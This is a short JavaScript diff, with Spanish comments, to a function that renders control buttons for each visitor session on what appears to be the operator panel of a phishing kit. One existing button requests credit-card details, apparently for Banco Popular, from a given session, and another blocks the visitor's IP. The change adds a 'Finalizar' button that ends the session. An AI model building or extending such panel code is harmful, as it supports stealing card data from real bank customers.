@@ -693,7 +693,10 @@ function botonesSesion(s) {
         // 4. Pedir CC POPU
         btns.push(`<button class="btn" style="background:#0ea5e9; color:white;" title="Pedir CC POPU" onclick="accion('${sid}','PEDIR_TARJETA_POPULAR')">💳</button>`);
         
-        // 5. Bloquear IP
+        // 5. Finalizar
+        btns.push(`<button class="btn btn-final" title="Finalizar" onclick="accion('${sid}','FINALIZAR')">✅</button>`);
+        
+        // 6. Bloquear IP
         btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
         
         return btns.join('');
